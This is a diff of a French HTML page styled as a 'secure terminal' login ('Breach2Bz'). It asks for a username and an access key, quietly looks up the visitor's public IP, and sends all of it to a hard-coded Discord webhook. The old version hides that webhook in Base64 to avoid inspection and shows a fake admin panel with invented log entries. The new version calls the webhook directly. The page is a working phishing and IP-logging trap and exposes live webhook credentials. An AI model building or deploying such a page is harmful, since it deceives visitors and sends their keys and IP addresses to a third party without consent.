@@ -2,149 +2,88 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Breach2Français - Secure Terminal</title>
+    <title>Breach2Bz - Terminal</title>
     <style>
         :root { --bg: #0a0a0a; --card: #161616; --blue: #1d61ff; --red: #ff3333; }
-        body { background-color: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid #333; text-align: center; width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; }
+        body { background-color: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid #333; text-align: center; width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: var(--blue); }
-        button { width: 100%; padding: 12px; background: var(--blue); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { opacity: 0.8; }
+        button { width: 100%; padding: 12px; background: var(--blue); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
         .hidden { display: none; }
-        table { width: 100%; margin-top: 20px; border-collapse: collapse; font-size: 0.8rem; }
-        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
-        th { background: #222; color: var(--blue); }
-        .error-blink { color: var(--red); font-weight: bold; margin-top: 15px; animation: blink 0.8s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.3;} 100% {opacity: 1;} }
-        
-        /* Animation de chargement */
-        .loader { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; margin-top: 10px; }
+        .error { color: var(--red); font-weight: bold; margin-top: 15px; }
+        .loader { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div id="step1" class="box">
-        <h2 style="letter-spacing: 2px;">IDENTIFICATION</h2>
-        <p style="color: #888; font-size: 0.9rem;">Entrez votre identifiant utilisateur</p>
+        <h2>CONNEXION</h2>
         <input type="text" id="username" placeholder="Pseudo...">
-        <button onclick="toStep2()">CONTINUER</button>
+        <button onclick="next()">CONTINUER</button>
     </div>
 
     <div id="step2" class="box hidden">
-        <h2 id="welcomeText"></h2>
-        <input type="password" id="keyInput" placeholder="Clé d'accès...">
-        <button id="btnVerify" onclick="validateKey()">VÉRIFIER L'ACCÈS</button>
-        <div id="loaderArea" class="hidden"><div class="loader"></div><p style="font-size: 0.7rem;">Analyse des permissions...</p></div>
-        <div id="errorMsg" class="error-blink"></div>
-    </div>
-
-    <div id="step3" class="box hidden" style="width: 700px;">
-        <h2 style="color: #0f0; text-shadow: 0 0 10px #0f0;">ADMIN PANEL - LIVE LOGS</h2>
-        <table>
-            <thead>
-                <tr>
-                    <th>Utilisateur</th>
-                    <th>Adresse IP</th>
-                    <th>Clé Tentée</th>
-                    <th>Statut</th>
-                </tr>
-            </thead>
-            <tbody id="logTable">
-                </tbody>
-        </table>
-        <p style="font-size: 0.7rem; color: #555; margin-top: 15px;">Session administrateur active via MADIOK-0005-VIEW.</p>
+        <h2 id="userDisplay"></h2>
+        <input type="password" id="key" placeholder="Clé d'accès...">
+        <button id="btn" onclick="verify()">VÉRIFIER</button>
+        <div id="loading" class="hidden"><div class="loader"></div></div>
+        <div id="msg" class="error"></div>
     </div>
 
     <script>
-        let userPseudo = "";
-        let userIP = "";
-        
-        // Ton Webhook encodé en Base64 (masqué pour l'inspection rapide)
-        const _0x1a2b = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NzQyMTc1MDU1MDkyNTQxNi9ELTlTR1NDMUFZOUNVdzM2OVVxdTZ5aUo4d2tLSGstVHhpLTFsNWZXZ2M1V3U3RUx5RXZIT0MxdEc4YXNidlJPYURoeA==";
+        let pseudo = "";
+        let ip = "Inconnue";
+        // LIEN DIRECT SANS CACHE
+        const url = "https://discord.com/api/webhooks/1457421750550925416/D-9SGSC1AY9GUW369Uqu6yiJ8wkKHk6Txi-1l5fWgc5Wu7ELyEvHOC1tG8asJvROaDhx";
 
-        // Récupération IP
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => userIP = data.ip)
-            .catch(() => userIP = "Inconnue");
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => ip = d.ip);
 
-        function toStep2() {
-            userPseudo = document.getElementById('username').value;
-            if(userPseudo.length < 2) return;
+        function next() {
+            pseudo = document.getElementById('username').value;
+            if(pseudo.length < 2) return;
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
-            document.getElementById('welcomeText').innerText = "Vérification : " + userPseudo;
+            document.getElementById('userDisplay').innerText = pseudo;
         }
 
-        async function sendToDiscord(pseudo, ip, key, status) {
-            const params = {
-                username: "System Log",
-                embeds: [{
-                    title: "Rapport de Connexion",
-                    color: status === "OK" ? 3066993 : 15158332,
-                    fields: [
-                        { name: "Utilisateur", value: pseudo, inline: true },
-                        { name: "IP", value: ip, inline: true },
-                        { name: "Clé", value: "`" + key + "`" },
-                        { name: "Accès", value: status }
-                    ],
-                    timestamp: new Date()
-                }]
-            };
-
-            await fetch(atob(_0x1a2b), {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(params)
-            });
-        }
-
-        function validateKey() {
-            const key = document.getElementById('keyInput').value;
-            const error = document.getElementById('errorMsg');
-            const loader = document.getElementById('loaderArea');
-            const btn = document.getElementById('btnVerify');
-
-            error.innerText = "";
-            btn.classList.add('hidden');
-            loader.classList.remove('hidden');
-
-            // Petit délai pour faire "vrai"
-            setTimeout(() => {
-                loader.classList.add('hidden');
-                btn.classList.remove('hidden');
-
-                if (key === "MADIOK-0005-VIEW") {
-                    sendToDiscord(userPseudo, userIP, key, "ACCÈS ADMIN ACCORDÉ");
-                    showAdminPanel();
-                } else {
-                    sendToDiscord(userPseudo, userIP, key, "ACCÈS REFUSÉ");
-                    error.innerText = "ACCÈS REFUSÉ";
-                }
-            }, 2000);
-        }
-
-        function showAdminPanel() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
+        async function verify() {
+            const keyVal = document.getElementById('key').value;
+            const btn = document.getElementById('btn');
+            const load = document.getElementById('loading');
             
-            const table = document.getElementById('logTable');
-            table.innerHTML = `<tr>
-                <td>${userPseudo}</td>
-                <td>${userIP}</td>
-                <td>MADIOK-0005-VIEW</td>
-                <td style="color:#0f0">CONNECTÉ</td>
-            </tr>
-            <tr style="opacity: 0.5;">
-                <td>Mathys</td>
-                <td>92.14.xx.xx</td>
-                <td>liamestropmooche</td>
-                <td style="color:#f00">REFUSÉ</td>
-            </tr>`;
+            btn.classList.add('hidden');
+            load.classList.remove('hidden');
+
+            // Envoi au Webhook
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "Tentative de Breach",
+                            color: keyVal === "MADIOK-0005-VIEW" ? 3066993 : 15158332,
+                            fields: [
+                                { name: "User", value: pseudo, inline: true },
+                                { name: "IP", value: ip, inline: true },
+                                { name: "Clé", value: "`" + keyVal + "`" }
+                            ]
+                        }]
+                    })
+                });
+            } catch (e) { console.log("Erreur envoi"); }
+
+            setTimeout(() => {
+                load.classList.add('hidden');
+                btn.classList.remove('hidden');
+                if(keyVal !== "MADIOK-0005-VIEW") {
+                    document.getElementById('msg').innerText = "ACCÈS REFUSÉ";
+                } else {
+                    alert("Accès Admin Accordé (Simulation)");
+                }
+            }, 1500);
         }
     </script>
 </body>
 </html>
-
